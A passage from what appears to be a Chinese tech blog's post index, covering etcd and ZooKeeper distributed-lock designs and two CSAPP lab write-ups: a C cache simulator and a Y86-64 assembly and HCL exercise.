向加锁的key中存储一个空值，这个操作就是一个加锁的操作，但是这把锁是有超时时间的，超时的时间是session的默认时长。超时是为了防止锁没有被正常释放导致死锁。 get: get就是通过key来查询 getOwner: 注意这里是用m.pfx来查询的，并且带了查询参数WithFirstCreate()。使用pfx来查询是因为其他的session也会用同样的pfx来尝试加锁，并且因为每个LeaseID都不同，所以第一次肯定会put成功。但是只有最早使用这个pfx的session才是持有锁的，所以这个getOwner的含义就是这样的。 接下来才是通过判断来检查是否持有锁\nm.myRev = resp.Header.Revision if !resp.Succeeded { m.myRev = resp.Responses[0].GetResponseRange().Kvs[0].CreateRevision } // if no key on prefix / the minimum rev is key, already hold the lock ownerKey := resp.Responses[1].GetResponseRange().Kvs if len(ownerKey) == 0 || ownerKey[0].CreateRevision == m.myRev { m.hdr = resp.Header return nil } m.myRev是当前的版本号，resp.Succeeded是cmp为true时值为true，否则是false。这里的判断表明当同一个session非第一次尝试加锁，当前的版本号应该取这个key的最新的版本号。\n下面是取得锁的持有者的key。如果当前没有人持有这把锁，那么默认当前会话获得了锁。或者锁持有者的版本号和当前的版本号一致， 那么当前的会话就是锁的持有者。\n// wait for deletion revisions prior to myKey hdr, werr := waitDeletes(ctx, client, m.pfx, m.myRev-1) // release lock key if wait failed if werr != nil { m.Unlock(client.Ctx()) } else { m.hdr = hdr } 上面这段代码就很好理解了，因为走到这里说明没有获取到锁，那么这里等待锁的删除。\nwaitDeletes方法的实现也很简单，但是需要注意的是，这里的getOpts只会获取比当前会话版本号更低的key，然后去监控最新的key的删除。等这个key删除了，自己也就拿到锁了。\n这种分布式锁的实现和我一开始的预想是不同的。它不存在锁的竞争，不存在重复的尝试加锁的操作。而是通过使用统一的前缀pfx来put，然后根据各自的版本号来排队获取锁。效率非常的高。避免了惊群效应\n如图所示，共有4个session来加锁，那么根据revision来排队，获取锁的顺序为session2 -\u0026gt; session3 -\u0026gt; session1 -\u0026gt; session4。\n这里面需要注意一个惊群效应，每一个client在锁住/lock这个path的时候，实际都已经插入了自己的数据，类似/lock/LEASE_ID，并且返回了各自的index（就是raft算法里面的日志索引），而只有最小的才算是拿到了锁，其他的client需要watch等待。例如client1拿到了锁，client2和client3在等待，而client2拿到的index比client3的更小，那么对于client1删除锁之后，client3其实并不关心，并不需要去watch。所以综上，等待的节点只需要watch比自己index小并且差距最小的节点删除事件即可。\n4.5 基于Zookeeper实现分布式锁 4.5.1 原理 zookeeper主要利用节点无法重复创建以及节点的监听通知机制来实现分布式锁的，当一个线程在zookeeper中创建了一个节点（假设“/node\u0026quot;)，其他线程再创建这个节点会提示失败。因为zookeeper内部执行命令跟redis一样是单线程的，多线程下的操作节点请求会排队执行，当发现节点已经存在，则提示节点已存在！\n当前线程加完锁，逻辑代码执行完毕后，还需要删除节点释放锁，供其他线程争抢。其他线程利用zookeeper的节点监听特性，一旦节点被修改（删除），就会收到来自服务端的消息，表示自己可以参与锁的争夺了，如果还是没有抢到则继续 监听/等待 此节点。zookeeper根据这两个特性可以实现分布式锁，分布式锁又分为公平锁、非公平锁、读写锁等等。\n4.5.2 zookeeper实现非公平锁 可以使用持久化节点和临时节点实现。一般使用临时节点，因为持久化节点需要自己手动删除，临时节点session关闭就会过期，zookeeper内部线程自动删除！\n加锁原理：\n上述非公平锁的实现方式在高并发场景下，性能会下降得比较厉害。主要原因：所有的连接都在对同一个节点进行监听，当服务器检测到删除事件时，要通知所有的连接，所有连接同时接收到事件，再次并发竞争，竞争失败再次等待，这也称为“羊群效应”。羊群效应需要大量地通知其他连接，而且不止一次，会造成资源浪费。\n为了避免羊群效应，可以采用公平锁的实现方式实现分布式锁。\n4.5.3 zookeeper实现公平锁 公平锁的实现需要保证节点的顺序性，可以使用zookeeper的持久化顺序节点 或者 临时顺序节点，推荐使用临时顺序节点。\n加锁原理：\n/lock节点可以用 Container节点类型，该节点类型规定，如果Container节点下面没有子节点，则Container节点在未来会被Zookeeper自动清除,定时任务默认60s 检查一次。使用 临时顺序子节点代表锁，在session关闭时，也会自动清理，进而触发/lock节点的自动删除，减少人工维护成本。\n问题一：当前线程怎么判断自己能不能获得锁？\n在公平锁的实现中，只有顺序最小的节点才能获取分布式锁，每当有一个线程进来就会对/lock节点下所有的子节点进行排序，并比较自己的序号是不是列表中最小的，如果是就获取锁，如果不是，就对序号比自己小的上一个节点进行监听。\n问题二：排队中的某个子节点如果挂掉，会导致监听序列崩溃吗？\n公平锁中，临时顺序节点中的每个节点都监听着前一个序号比它小的节点。以A-B-C三个节点为例，A为最小的节点，如果B节点挂掉了（或者被删除），此时A节点仍然在处理业务逻辑，未被释放，那么整个序列都会变为不连续的。但是B节点挂掉（或者被删除）会对C节点发送通知机制，C接收到B已挂掉的通知，要去竞争锁，所以C会获取/lock节点下所有的子节点，排序比较它是否为最小的节点，发现自己不是，因为A还在，然后C节点会对序号比它小的A节点进行监听，自动跳过了意外挂掉的B节点，这样就完成了监听关系的自动维护！\n问题三：顺序子节点已创建，但服务端响应失败，造成节点多次创建如何解决？\n客户端发送节点创建的命令，服务器接收到并创建成功，但是响应客户端的时候，服务器闪断了，又在session超时时间内连接上了。此时节点已经创建成功了，但是客户端并没有收到节点创建成功的消息，它认为节点已经创建失败，由于客户端重试机制的存在，会重新发送创建节点的命令，这样就会导致节点多次创建，会有部分顺序节点一直存在服务器中，不会被释放，称为僵尸节点。\n4.5.4 zookeeper实现读写锁（共享锁） zookeeper的公平锁和非公平锁的实现都有一个共同特性，都是互斥锁，同一时间只能有一个请求占有。如果请求并发量增大后，无论读写，所有的请求都得加锁，性能会急剧下降。所以，我们不需要所有请求都加锁，如果数据没有任何写操作只有读操作的话，可以不用加锁。\n如果读数据的请求还没完成，这时候对数据的写请求到来。这时候已经有人在读数据了，这时候不能再写数据了，不然数据不正确。所以直到前面读锁全部释放完以后，写请求才能执行，所以需要给所有的读请求加一个读标识（读锁），让写请求知道，这个时候是不能修改数据的。不然数据不一致。\n同样，当写操作还没完成，读操作是不允许执行的，不然也会导致数据不一致，所以要给写请求加一个写标识（写锁），避免同时对共享数据进行写操作。\n（1）读请求：如果前面的请求都是read，则直接获取锁（读读共享），如果前面的请求有write请求，则该read请求不能直接获取锁（读写互斥），需要对前面的write请求节点进行监听。如果前面有多个write请求，则对距离自己最近的write请求进行监听。\n（2）写请求：无论前面是read请求还是write请求，都会对其监听，与公平锁和非公平锁性质不同，对其他行为互斥。\n五、总结 目前为止，已经对分布式的概念有了比较清晰的理解，了解了一些分布式协议的原理以及分布式锁的实现等，对自己学习与实现分布式锁有很大的帮助，当然我了解到的还只是分布式领域的冰山一角，还有许多知识等待我继续挖掘研究。\n","id":3,"section":"posts","summary":"分布式相关算法总结 一、拜占庭将军问题 拜占庭将军问题是一个共识问题。这个概念最早由Leslie Lamport于1980年发表的“Reachin","tags":["分布式"],"title":"分布式相关算法总结","uri":"https://lincx-911.github.io/2022/01/distribution/","year":"2022"},{"content":"CSAPP\u0026ndash;Cache Lab实验记录 前言 This lab will help you understand the impact that cache memories can have on the performance of your C programs. The lab consists of two parts.\nIn the first part you will write a small C program (about 200-300 lines) that simulates the behavior of a cache memory. In the second part, you will optimize a small matrix transpose function, with the goal of minimizing the number of cache misses.\n这个实验包括两个部分，Part A 是编写一个c语言cache模拟器。Part B是一个矩阵转置，给出了三种规模，你的任务就是尽可能的提高高速缓存的命中率，它会根据你的miss，hits，eviction这三个值的大小进行打分，评分的范围已给出。\n实验准备 下载实验资料\u0026ndash;官网 深入理解计算机系统第六章 实验指导ppt 实验内容 Part A （1）内容分析\n编写一个cache模拟器，该模拟器可以模拟在一系列的数据访问中cache的命中、不命中与牺牲行的情况，其中，需要牺牲行时，用LRU替换策略进行替换。\ncache模拟器需要处理下列的命令\nUsage: ./csim-ref [-hv] -s \u0026lt;s\u0026gt; -E \u0026lt;E\u0026gt; -b \u0026lt;b\u0026gt; -t \u0026lt;tracefile\u0026gt; 其中各参数意义如下：\n①-h：输出帮助信息的选项；\n②-v：输出详细运行过程信息的选项；\n③-s：组索引的位数(意味着组数S=2^s)；\n④-E：每一组包含的行数；\n⑤-b：偏移位的宽度(意味着块的大小为B=2^b);\n⑥-t：输入数据文件的路径(测试数据从该文件里面读取)。\ntraces 文件夹下面的五个文件是测试数据。以·yi.trace为例\n$ cat yi.trace L 10,1 M 20,1 L 22,1 S 18,1 L 110,1 L 210,1 M 12,1 格式为：\n(空格) 操作类型 地址 大小\n其中，\n“I”表示指令加载，\n“L”表示数据加载，\n“S”表示数据存储，\n“M”表示数据修改（即数据存储之后的数据加载）。\n每个“I”前面都没有空格。每个“M”，“L”和“S”之前总是有空格。\n地址字段指定一个32位的十六进制存储器地址。\n大小字段指定操作访问的字节数；\n每个数据加载 (L) 或存储 (S) 操作最多可导致一次缓存未命中。数据修改操作 (M) 被视为加载，然后是存储到同一地址。因此，M 操作可能导致两次缓存命中，或者一次未命中和一次命中加上可能的逐出。\n（2）cache\n首先是cache的构成:\ncache有2^s组，每组有E行（E分为三种情况：E=1，称为直接映射高速缓存；1\u0026lt;E\u0026lt;C/B:组相联高速缓存；E=C/B，全相连高速缓存，也就是一组包含了所有的行），然后是每行的构成：（1）有效位vild(取0和1，1表示存储了有效信息，0表示没有，判断命中的时候需要用到）（2）标记位t=m-(s+b),当cpu要读取某个地址的内容时，就会将某个地址的第一个部分：标记位与它进行对比，匹配相等则命中，也就是锁定在某一行（3）数据块B，B负责存储这个地址的内容，把B想象成字节数组就好，共有B-1个小块（别和B这个数据块搞混咯,下标从0开始，因此是B-1）。在这里简单提下b的作用吧，虽然实验没用到。b理解为数据块B这个数组的下标就好，也就是你要从B[b]这个位置开始读取字。注意这里的数据都是2进制的。\n根据上面的分析可以定义cache结构体：\n// 定义行属性 typedef struct{ int valid_bit; int tag; int lru_count; }Cache_line,**Cache; （3）几个函数\n**getopt()：**解析命令行 **fscanf：**读文件 **malloc/free：**分配释放内存 （4）编写程序\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include\u0026lt;malloc.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include\u0026lt;getopt.h\u0026gt; #include\u0026quot;cachelab.h\u0026quot; int h,v,s,E,b,S; //模拟参数 char trace[1000]; //接收trace文件路径 int hit_count,miss_count,eviction_count; // 定义行属性 typedef struct{ int valid_bit; int tag; int lru_stamp;//时间戳 }Cache_line,*Cache_asso,**Sim_cache; Sim_cache Cache = NULL; int timenow=0; // 记录当前时间 // 初始化cache void init_cache(){ Cache = (Sim_cache)malloc(sizeof(Cache_asso)*S); for(int i=0;i\u0026lt;S;++i){ Cache[i] = (Cache_asso)malloc(sizeof(Cache_line)*E); for(int j=0;j\u0026lt;E;++j){ Cache[i][j].valid_bit=0; Cache[i][j].tag=-1; Cache[i][j].lru_stamp=0; } } } /* 打印 helper 内容的函数，-h 命令使用，内容可自定义*/ void printUsage() { printf(\u0026quot;Usage: ./csim-ref [-hv] -s \u0026lt;num\u0026gt; -E \u0026lt;num\u0026gt; -b \u0026lt;num\u0026gt; -t \u0026lt;file\u0026gt;\\n\u0026quot; \u0026quot;Options:\\n\u0026quot; \u0026quot; -h Print this help message.\\n\u0026quot; \u0026quot; -v Optional verbose flag.\\n\u0026quot; \u0026quot; -s \u0026lt;num\u0026gt; Number of set index bits.\\n\u0026quot; \u0026quot; -E \u0026lt;num\u0026gt; Number of lines per set.\\n\u0026quot; \u0026quot; -b \u0026lt;num\u0026gt; Number of block offset bits.\\n\u0026quot; \u0026quot; -t \u0026lt;file\u0026gt; Trace file.\\n\\n\u0026quot; \u0026quot;Examples:\\n\u0026quot; \u0026quot; linux\u0026gt; ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\\n\u0026quot; \u0026quot; linux\u0026gt; ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\\n\u0026quot;); } // 加载数据 void loadData(unsigned int addr){ int set_index=(addr \u0026gt;\u0026gt; b) \u0026amp; ((-1U) \u0026gt;\u0026gt; (64 - s)); int tag = addr\u0026gt;\u0026gt;(b+s); int min_stamp = INT_MAX; int min_stamp_index = -1; for(int i=0;i\u0026lt;E;++i){ if(Cache[set_index][i].tag==tag){ Cache[set_index][i].lru_stamp=timenow; ++hit_count; if(v==1)printf(\u0026quot;hit \u0026quot;); return; } } // 未命中 for(int i=0;i\u0026lt;E;++i){ //查看有无空位 if(Cache[set_index][i].valid_bit==0){ Cache[set_index][i].valid_bit=1; Cache[set_index][i].tag = tag; Cache[set_index][i].lru_stamp=timenow; ++miss_count; if(v==1)printf(\u0026quot;miss \u0026quot;); return; } } if(v==1)printf(\u0026quot;miss eviction \u0026quot;); //满了 ++eviction_count; ++miss_count; //找出早那个 for(int i=0;i\u0026lt;E;++i){ if(Cache[set_index][i].lru_stamp\u0026lt;min_stamp){ min_stamp_index=i; min_stamp=Cache[set_index][i].lru_stamp; } } Cache[set_index][min_stamp_index].tag=tag; Cache[set_index][min_stamp_index].lru_stamp=timenow; return; } // 释放内存 void free_Cache(){ for(int i = 0; i \u0026lt; S; ++i) free(Cache[i]); free(Cache); } // 解析trace的参数 void pahse_trace(){ FILE* pFile = fopen(trace,\u0026quot;r\u0026quot;); if(pFile==NULL){ printf(\u0026quot;open file error\\n\u0026quot;); exit(-1); } char op[10]; unsigned int addr; int size; while(fscanf(pFile,\u0026quot;%s %x,%d\\n\u0026quot;,op,\u0026amp;addr,\u0026amp;size)\u0026gt;0){ if(strcmp(op,\u0026quot;I\u0026quot;)==0)continue; if(v==1)printf(\u0026quot;%s %x %d \u0026quot;,op,addr,size); loadData(addr); if(strcmp(op,\u0026quot;M\u0026quot;)==0){ loadData(addr); } if(v==1)printf(\u0026quot;\\n\u0026quot;); timenow++; } fclose(pFile); free_Cache(); } int main(int argc, char* argv[]) { h=0; v=0; hit_count=miss_count=eviction_count=0; int opt=-1; while (-1!=(opt=getopt(argc,argv,\u0026quot;hvs:E:b:t:\u0026quot;))) { switch (opt) { case 'v': v = 1; break; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': strcpy(trace,optarg); break; case 'h': h = 1; default: printUsage(); break; } } //检验参数 if(s\u0026lt;=0 || E\u0026lt;=0 || b\u0026lt;=0 ||trace==NULL){ printf(\u0026quot;illegal argument\\n\u0026quot;); exit(-1); } S=1\u0026lt;\u0026lt;s; if(h==1){ printUsage(); } init_cache(); pahse_trace(); printSummary(hit_count, miss_count, eviction_count); return 0; } 编译，并查看结果：\n$ make clean;make rm -rf *.o rm -f *.tar rm -f csim rm -f test-trans tracegen rm -f trace.all trace.f* rm -f .csim_results .marker gcc -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c gcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c # Generate a handin tar file each time you compile tar -cvf lincx-handin.tar csim.c trans.c csim.c trans.c $ ./test-csim Your simulator Reference simulator Points (s,E,b) Hits Misses Evicts Hits Misses Evicts 3 (1,1,1) 9 8 6 9 8 6 traces/yi2.trace 3 (4,2,4) 4 5 2 4 5 2 traces/yi.trace 3 (2,1,4) 2 3 1 2 3 1 traces/dave.trace 3 (2,1,3) 167 71 67 167 71 67 traces/trans.trace 3 (2,2,3) 201 37 29 201 37 29 traces/trans.trace 3 (2,4,3) 212 26 10 212 26 10 traces/trans.trace 3 (5,1,5) 231 7 0 231 7 0 traces/trans.trace 6 (5,1,5) 265189 21775 21743 265189 21775 21743 traces/long.trace 27 TEST_CSIM_RESULTS=27 全部通过。\nPart B （1）任务：\n编写一个实现矩阵转置的函数。即对于给定的矩阵A[N][M]，得到矩阵B[M][N]，使得对于任意0\u0026lt;=i\u0026lt;N、0\u0026lt;=j\u0026lt;M，有B[j][i]=A[i][j]，并且使函数调用过程中对cache的不命中数miss尽可能少。\n在如下函数里面编写最终代码：\nchar transpose_submit_desc[] = \u0026ldquo;Transpose submission\u0026rdquo;;\nvoid transpose_submit(int M, int N, int A[N][M], int B[M][N])；\n要求：\n最多只能定义 12 个局部变量\n不使用任何的数组，不调用任何类似于 malloc 的开辟内存的函数\n测试矩阵的规模为 32 × 32，64 × 64，61 × 67\n测试 cache 的组成：32 组， 每组一行，每个块 32 字节。对于编写的函数，miss 个数越少越好。\n（2）分析\n这里可分成32x32，16x16，8x8，4x4,cache每块的字节数是32，也就是8个int，因此为了有效地利用cache的块容量，选取8x8的分块效果是最好的。\n","id":4,"section":"posts","summary":"CSAPP\u0026ndash;Cache Lab实验记录 前言 This lab will help you understand the impact that cache memories can have on the performance of your C programs. The lab consists of two parts. In the first part you will write a small C program (about 200-300 lines) that simulates the behavior of a cache memory. In the second part, you will optimize a small matrix transpose function,","tags":["csapp-lab"],"title":"CSAPP--Cache Lab实验记录","uri":"https://lincx-911.github.io/2021/12/cache_lab/","year":"2021"},{"content":"CSAPP\u0026ndash;Architecture Lab实验记录 实验准备 实验资料 《深入理解计算机系统》第四章 处理器体系结构 lab官网 环境搭建 博主用的是 linux （ubuntu20.04）\n1、首先下载实验资料\n$ wget http://csapp.cs.cmu.edu/im/labs/archlab.tar 2、解压\n$ tar xvf archlab-handout.tar $ cd archlab-handout $ tar xvf sim.tar 因为本套实验依赖tcl/tk、flex、bison，我们需要安装这几个软件：\n$ sudo apt install tcl tcl-dev tk tk-dev $ sudo apt-get install bison flex 因为 Makefile 里写的 tcl 的版本已经比较老了，我们需要修改一下 Makefile：\n$ sed -i \u0026quot;s/tcl8.5/tcl8.6/g\u0026quot; Makefile $ sed -i \u0026quot;s/CFLAGS=/CFLAGS=-DUSE_INTERP_RESULT /g\u0026quot; Makefile 3、执行编译：\n$ cd sim $ make clean; make 实验内容 Part A 这个部分在 sim/misc 这个文档夹里完成。你的任务就是写 3 个 Y86-64 进程并且模拟它。这 3 个进程要实现的功能在 sim/misc/examples.c 里面。\nexamples.c内容：\n/* * Architecture Lab: Part A * * High level specs for the functions that the students will rewrite * in Y86-64 assembly language */ /* $begin examples */ /* linked list element */ typedef struct ELE { long val; struct ELE *next; } *list_ptr; /* sum_list - Sum the elements of a linked list */ long sum_list(list_ptr ls) { long val = 0; while (ls) { val += ls-\u0026gt;val; ls = ls-\u0026gt;next; } return val; } /* rsum_list - Recursive version of sum_list */ long rsum_list(list_ptr ls) { if (!ls) return 0; else { long val = ls-\u0026gt;val; long rest = rsum_list(ls-\u0026gt;next); return val + rest; } } /* copy_block - Copy src to dest and return xor checksum of src */ long copy_block(long *src, long *dest, long len) { long result = 0; while (len \u0026gt; 0) { long val = *src++; *dest++ = val; result ^= val; len--; } return result; } /* $end examples */ 使用 YAS 将相应的进程转换成二进制，然后再把生成的二进制放到命令集模拟器 YIS 上运行。\n下面是三组链表数据：\n# Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 sum.ys: 迭代计算链表元素和 Write a Y86-64 program sum.ys that iteratively sums the elements of a linked list. Your program should consist of some code that sets up the stack structure, invokes a function, and then halts. In this case, the function should be Y86-64 code for a function (sum list) that is functionally equivalent to the C sum list function in Figure 1\n# sum_list.ys by linxc # Execution begins at address 0 .pos 0 irmovq stack,%rsp call main halt # Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: irmovq ele1,%rdi call sum_list ret sum_list: xorq %rax,%rax jmp test loop: mrmovq (%rdi),%rsi addq %rsi,%rax #求和 mrmovq 8(%rdi), %rdi # 将指针(下一个 struct 的地址)放进 %rdi test: andq %rdi,%rdi jne loop ret stack: 接下来用 YAS 和 YIS 进行汇编并模拟运行,结果：\n$ ./yas sum.ys $ ./yis sum.yo Stopped in 26 steps at PC = 0x13. Status 'HLT', CC Z=1 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000100 %r9: 0x0000000000000000 0x0000000000000c00 Changes to memory: 0x00f0: 0x0000000000000000 0x000000000000005b 0x00f8: 0x0000000000000000 0x0000000000000013 可以看到 %rax 的值就是标号 ele1，ele2，ele3 处三个元素的和 0xcba，并且可以看到部分寄存器和部分内存地址的值也发生了改变。\nrsum.ys: 递归计算链表元素和 写一个类似的 Y86-64 进程 rsum.ys 递归的计算链表的和，链表元素与上面一样。\n# rsum_list.ys by linxc # Execution begins at address 0 .pos 0 irmovq stack,%rsp call main halt # Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: irmovq ele1,%rdi call rsum_list ret rsum_list: pushq %r12 xorq %rax,%rax andq %rdi,%rdi je re mrmovq (%rdi),%r12 mrmovq 8(%rdi), %rdi# 将指针(下一个 struct 的地址)放进 %rdi call rsum_list addq %r12,%rax re: popq %r12 ret .pos 0x100 stack: 结果：\n$ ./yas rsum.ys $ ./yis rsum.yo Stopped in 42 steps at PC = 0x13. Status 'HLT', CC Z=0 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000100 Changes to memory: 0x00b8: 0x0000000000000000 0x0000000000000c00 0x00c0: 0x0000000000000000 0x0000000000000088 0x00c8: 0x0000000000000000 0x00000000000000b0 0x00d0: 0x0000000000000000 0x0000000000000088 0x00d8: 0x0000000000000000 0x000000000000000a 0x00e0: 0x0000000000000000 0x0000000000000088 0x00f0: 0x0000000000000000 0x000000000000005b 0x00f8: 0x0000000000000000 0x0000000000000013 copy.ys: 复制函数 将内存中的一块数据拷贝到另一个不重叠的内存位置，并计算被拷贝数据的 checksum(Xor)。C 语言代码如下：\n# copy.ys by linxc # Execution begins at address 0 .pos 0 irmovq stack,%rsp call main halt .align 8 # Source block src: .quad 0x00a .quad 0x0b0 .quad 0xc00 # Destination block dest: .quad 0x111 .quad 0x222 .quad 0x333 main: irmovq src,%rdi irmovq dest,%rsi irmovq $3,%rdx call copy_block ret copy_block: pushq %r8 pushq %r9 pushq %r12 irmovq $1,%r9 irmovq $8,%r12 xorq %rax,%rax jmp re loop: mrmovq 0(%rdi),%r8 addq %r12,%rdi rmmovq %r8,(%rsi) addq %r12,%rsi xorq %r8,%rax #求和 subq %r9,%rdx re: andq %rdx, %rdx # len \u0026gt; 0？ jne loop popq %r12 popq %r9 popq %r8 ret .pos 0x100 stack: 运行结果如下：\n$ ./yas copy.ys $ ./yis copy.yo Stopped in 45 steps at PC = 0x13. Status 'HLT', CC Z=1 S=0 O=0 Changes to registers: %rax: 0x0000000000000000 0x0000000000000cba %rsp: 0x0000000000000000 0x0000000000000100 %rsi: 0x0000000000000000 0x0000000000000048 %rdi: 0x0000000000000000 0x0000000000000030 Changes to memory: 0x0030: 0x0000000000000111 0x000000000000000a 0x0038: 0x0000000000000222 0x00000000000000b0 0x0040: 0x0000000000000333 0x0000000000000c00 0x00f0: 0x0000000000000000 0x000000000000006f 0x00f8: 0x0000000000000000 0x0000000000000013 Part B 这部分在目录 sim/seq 里完成。要求为处理器增加一个iaddq指令。通过修改 seq-full.hcl 文档，使其支持 iaddq 命令。\n按照提示，我们可以看书本p266，图4-18 irmovq指令计算顺序，模拟iaddq指令顺序：\n取指：icode：ifun\u0026lt;\u0026mdash;M1[PC] rA: rB \u0026lt;\u0026ndash;M1[PC+1] valC \u0026lt;\u0026ndash;M8[PC+2] valP \u0026lt;\u0026mdash;PC+10 译码：valB \u0026lt;\u0026mdash;R[rb] 执行：valE\u0026lt;\u0026ndash;valC+valB 访存：无 写回：R[rb]\u0026lt;\u0026ndash;valE 更新PC：PC\u0026lt;\u0026ndash;valP 按照上面修改seq-full.hcl 文档内容如下：\n#/* $begin seq-all-hcl */ #################################################################### # HCL Description of Control for Single Cycle Y86-64 Processor SEQ # # Copyright (C) Randal E. Bryant, David R. O'Hallaron, 2010 # #################################################################### ## Your task is to implement the iaddq instruction ## The file contains a declaration of the icodes ## for iaddq (IIADDQ) ## Your job is to add the rest of the logic to make it work #################################################################### # C Include's. Don't alter these # #################################################################### quote '#include \u0026lt;stdio.h\u0026gt;' quote '#include \u0026quot;isa.h\u0026quot;' quote '#include \u0026quot;sim.h\u0026quot;' quote 'int sim_main(int argc, char *argv[]);' quote 'word_t gen_pc(){return 0;}' quote 'int main(int argc, char *argv[])' quote ' {plusmode=0;return sim_main(argc,argv);}' #################################################################### # Declarations. Do not change/remove/delete any of these # #################################################################### ##### Symbolic representation of Y86-64 Instruction Codes ############# wordsig INOP 'I_NOP' wordsig IHALT 'I_HALT' wordsig IRRMOVQ 'I_RRMOVQ' wordsig IIRMOVQ 'I_IRMOVQ' wordsig IRMMOVQ 'I_RMMOVQ' wordsig IMRMOVQ 'I_MRMOVQ' wordsig IOPQ 'I_ALU' wordsig IJXX 'I_JMP' wordsig ICALL 'I_CALL' wordsig IRET 'I_RET' wordsig IPUSHQ 'I_PUSHQ' wordsig IPOPQ 'I_POPQ' # Instruction code for iaddq instruction wordsig IIADDQ 'I_IADDQ' ##### Symbolic represenations of Y86-64 function codes ##### wordsig FNONE 'F_NONE' # Default function code ##### Symbolic representation of Y86-64 Registers referenced explicitly ##### wordsig RRSP 'REG_RSP' # Stack Pointer wordsig RNONE 'REG_NONE' # Special value indicating \u0026quot;no register\u0026quot; ##### ALU Functions referenced explicitly ##### wordsig ALUADD 'A_ADD' # ALU should add its arguments ##### Possible instruction status values ##### wordsig SAOK 'STAT_AOK' # Normal execution wordsig SADR 'STAT_ADR' # Invalid memory address wordsig SINS 'STAT_INS' # Invalid instruction wordsig SHLT 'STAT_HLT' # Halt instruction encountered ##### Signals that can be referenced by control logic #################### ##### Fetch stage inputs ##### wordsig pc 'pc' # Program counter ##### Fetch stage computations ##### wordsig imem_icode 'imem_icode' # icode field from instruction memory wordsig imem_ifun 'imem_ifun' # ifun field from instruction memory wordsig icode 'icode' # Instruction control code wordsig ifun 'ifun' # Instruction function wordsig rA 'ra' # rA field from instruction wordsig rB 'rb' # rB field from instruction wordsig valC 'valc' # Constant from instruction wordsig valP 'valp' # Address of following instruction boolsig imem_error 'imem_error' # Error signal from instruction memory boolsig instr_valid 'instr_valid' # Is fetched instruction valid? ##### Decode stage computations ##### wordsig valA 'vala' # Value from register A port wordsig valB 'valb' # Value from register B port ##### Execute stage computations ##### wordsig valE 'vale' # Value computed by ALU boolsig Cnd 'cond' # Branch test ##### Memory stage computations ##### wordsig valM 'valm' # Value read from memory boolsig dmem_error 'dmem_error' # Error signal from data memory #################################################################### # Control Signal Definitions. # #################################################################### ################ Fetch Stage ################################### # Determine instruction code word icode = [ imem_error: INOP; 1: imem_icode; # Default: get from instruction memory ]; # Determine instruction function word ifun = [ imem_error: FNONE; 1: imem_ifun; # Default: get from instruction memory ]; bool instr_valid = icode in { INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ, IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ }; # Does fetched instruction require a regid byte? bool need_regids = icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ }; # Does fetched instruction require a constant word? bool need_valC = icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL,IIADDQ }; ################ Decode Stage ################################### ## What register should be used as the A source? word srcA = [ icode in { IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ } : rA; icode in { IPOPQ, IRET } : RRSP; 1 : RNONE; # Don't need register ]; ## What register should be used as the B source? word srcB = [ icode in { IOPQ, IRMMOVQ, IMRMOVQ,IIADDQ } : rB; icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP; 1 : RNONE; # Don't need register ]; ## What register should be used as the E destination? word dstE = [ icode in { IRRMOVQ } \u0026amp;\u0026amp; Cnd : rB; icode in { IIRMOVQ, IOPQ,IIADDQ } : rB; icode in { IPUSHQ, IPOPQ, ICALL, IRET } : RRSP; 1 : RNONE; # Don't write any register ]; ## What register should be used as the M destination? word dstM = [ icode in { IMRMOVQ, IPOPQ } : rA; 1 : RNONE; # Don't write any register ]; ################ Execute Stage ################################### ## Select input A to ALU word aluA = [ icode in { IRRMOVQ, IOPQ } : valA; icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ,IIADDQ } : valC; icode in { ICALL, IPUSHQ } : -8; icode in { IRET, IPOPQ } : 8; # Other instructions don't need ALU ]; ## Select input B to ALU word aluB = [ icode in { IRMMOVQ, IMRMOVQ, IOPQ, ICALL, IPUSHQ, IRET, IPOPQ,IIADDQ } : valB; icode in { IRRMOVQ, IIRMOVQ } : 0; # Other instructions don't need ALU ]; ## Set the ALU function word alufun = [ icode == IOPQ : ifun; 1 : ALUADD; ]; ## Should the condition codes be updated? bool set_cc = icode in { IOPQ }; ################ Memory Stage ################################### ## Set read control signal bool mem_read = icode in { IMRMOVQ, IPOPQ, IRET }; ## Set write control signal bool mem_write = icode in { IRMMOVQ, IPUSHQ, ICALL }; ## Select memory address word mem_addr = [ icode in { IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ } : valE; icode in { IPOPQ, IRET } : valA; # Other instructions don't need address ]; ## Select memory input data word mem_data = [ # Value from register icode in { IRMMOVQ, IPUSHQ } : valA; # Return PC icode == ICALL : valP; # Default: Don't write anything ]; ## Determine instruction status word Stat = [ imem_error || dmem_error : SADR; !instr_valid: SINS; icode == IHALT : SHLT; 1 : SAOK; ]; ################ Program Counter Update ############################ ## What address should instruction be fetched at word new_pc = [ # 